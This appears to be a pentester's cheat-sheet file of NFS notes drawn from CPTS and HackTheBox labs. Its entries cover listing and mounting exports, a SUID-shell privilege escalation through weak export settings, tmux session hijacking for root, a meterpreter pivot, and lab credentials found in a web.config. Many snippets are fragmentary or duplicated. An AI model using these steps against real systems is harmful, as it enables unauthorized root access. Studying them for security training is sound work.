# NFS

% nfs, cpts

## NFS - NFS - NFS - NFS - NFS - nfs-interactions
#cat/RECON #cpts
```
nfsshell
```

## NFS - NFS - NFS - NFS - NFS - dangerous-settings
#cat/RECON #cpts
On Linux, the settings are located here :

```
cat /etc/exports
```

## NFS - NFS - NFS - NFS - NFS - weak-nfs-privileges
#cat/RECON #cpts
Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command

```
showmount -e 10.129.2.12
```

## NFS - NFS - NFS - NFS - NFS - weak-nfs-privileges-2
#cat/RECON #cpts
Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command

```
Export list for 10.129.2.12:
```

## NFS - NFS - NFS - NFS - NFS - weak-nfs-privileges-3
#cat/RECON #cpts
When an NFS volume is created, various options can be set:

```
:~$ cat /etc/exports
```

## NFS - NFS - NFS - NFS - NFS - weak-nfs-privileges-4
#cat/RECON #cpts
For example, we can create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit. First

```
:/tmp$ cat shell.c
```

## NFS - NFS - NFS - NFS - NFS - weak-nfs-privileges-5
#cat/RECON #cpts
```
:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

## NFS - NFS - NFS - NFS - NFS - weak-nfs-privileges-6
#cat/RECON #cpts
When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

```
:/tmp$ ls -la
```

## NFS - NFS - NFS - NFS - NFS - weak-nfs-privileges-7
#cat/RECON #cpts
```
:/tmp$ ./shell
```

## NFS - NFS - NFS - NFS - NFS - hijacking-tmux-sessions
#cat/RECON #cpts
Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach

```
:~$ tmux -S /shareds new -s debugsess
```

## NFS - NFS - NFS - NFS - NFS - hijacking-tmux-sessions-2
#cat/RECON #cpts
If we can compromise a user in the `devs` group, we can attach to this session and gain root access. Check for any running `tmux` processes.

```
:~$ ps aux | grep tmux
```

## NFS - NFS - NFS - NFS - NFS - hijacking-tmux-sessions-3
#cat/RECON #cpts
Confirm permissions.

```
:~$ ls -la /shareds
```

## NFS - NFS - NFS - NFS - NFS - hijacking-tmux-sessions-5
#cat/RECON #cpts
Finally, attach to the `tmux` session and confirm root privileges.

```
:~$ tmux -S /shareds
```

## NFS - NFS - NFS - NFS - NFS - review-the-nfs-servers-export-list-and-find-a-directory-holding-a-flag
#cat/RECON #cpts
After spawning the target machine, students first need to list its exports using `showmount` with the `-e` (short version of the long version `--exports`) option:

```
showmount -e STMIP
```

## NFS - NFS - NFS - NFS - NFS - review-the-nfs-servers-export-list-and-find-a-directory-holding-a-flag-2
#cat/RECON #cpts
```
└──╼ [★]$ showmount -e 10.129.2.210
```

## NFS - NFS - NFS - NFS - NFS - review-the-nfs-servers-export-list-and-find-a-directory-holding-a-flag-4
#cat/RECON #cpts
Students subsequently need to mount the NFS share `/var/nfs/general` using the `mount` command with the `-t` (short version of the long version `--type`) option:

```
sudo mount -t nfs STMIP:/var/nfs/general /mnt
```

## NFS - NFS - NFS - NFS - NFS - review-the-nfs-servers-export-list-and-find-a-directory-holding-a-flag-5
#cat/RECON #cpts
```
└──╼ [★]$ sudo mount -t nfs 10.129.2.210:/var/nfs/general /mnt
```

## NFS - NFS - NFS - NFS - NFS - review-the-nfs-servers-export-list-and-find-a-directory-holding-a-flag-6
#cat/RECON #cpts
At last, students will find the flag `exports_flag.txt` in the `/mnt` directory:

```
cat /mnt/exports_flag.txt
```

## NFS - NFS - NFS - NFS - NFS - review-the-nfs-servers-export-list-and-find-a-directory-holding-a-flag-7
#cat/RECON #cpts
```
shell-session
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your
#cat/RECON #cpts
Then, using the SSH connection established from before (when beginning to setup the SSH pivot), students need to change directories to `/tmp/` and change the permissions of the payload file to make it executable then run

```
cd /tmp/
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-2
#cat/RECON #cpts
Then, using the SSH connection established from before (when beginning to setup the SSH pivot), students need to change directories to `/tmp/` and change the permissions of the payload file to make it executable then run

```
./shell.elf
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-3
#cat/RECON #cpts
Thereafter, students need to background the `meterpreter` session and add a route to the 172.16.8.0 network:

```
set SESSION 1
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-4
#cat/RECON #cpts
Thereafter, students need to background the `meterpreter` session and add a route to the 172.16.8.0 network:

```
set SUBNET 172.16.8.0
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-5
#cat/RECON #cpts
Then, from within the established SSH connection/session on `Pwnbox`/`PMVPN` to the root user of `STMIP` (students can terminate the "shell.elf" payload safely), students need to make a directory and create a mount point

```
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01/
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-6
#cat/RECON #cpts
Then, from within the established SSH connection/session on `Pwnbox`/`PMVPN` to the root user of `STMIP` (students can terminate the "shell.elf" payload safely), students need to make a directory and create a mount point

```
cat DEV01/flag.txt
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-7
#cat/RECON #cpts
```
:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01/
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-8
#cat/RECON #cpts
However, students can also enumerate the NFS share further, to find the credentials `Administrator:D0tn31Nuk3R0ck$$@123` in the file "web.config" under the "DNN" directory, which will be used in the upcoming question:

```
cd DEV01
```

## NFS - NFS - NFS - NFS - NFS - mount-an-nfs-share-and-find-a-flagtxt-file-submit-the-contents-as-your-9
#cat/RECON #cpts
However, students can also enumerate the NFS share further, to find the credentials `Administrator:D0tn31Nuk3R0ck$$@123` in the file "web.config" under the "DNN" directory, which will be used in the upcoming question:

```
cat DNN/web.config
```

## NFS - NFS - NFS - NFS - NFS - vulncicada
#cat/RECON #cpts
extrait du PDF Joplin: vulncicada

```
showmount -e cicada.vl Export list for cicada.vl: /profiles (everyone)
```

## NFS - NFS - NFS - NFS - NFS - vulncicada-2
#cat/RECON #cpts
extrait du PDF Joplin: vulncicada

```
sudo mount -t nfs -o rw cicada.vl:/profiles /mnt
```

